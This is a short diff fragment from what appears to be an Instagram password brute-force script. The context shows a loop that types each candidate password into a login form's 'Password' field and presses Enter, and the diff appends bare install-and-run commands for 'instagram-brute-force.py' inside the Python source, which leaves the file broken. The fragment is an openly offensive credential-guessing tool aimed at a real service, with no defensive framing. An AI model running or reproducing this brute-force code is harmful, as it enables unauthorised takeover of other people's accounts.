@@ -30,3 +30,5 @@ for brute in bruteforce:
     web.type(brute, into="Password")
     keyboard.press(Key.enter)
     keyboard.release(Key.enter)
+pip install -r requirements.txt
+python instagram-brute-force.py
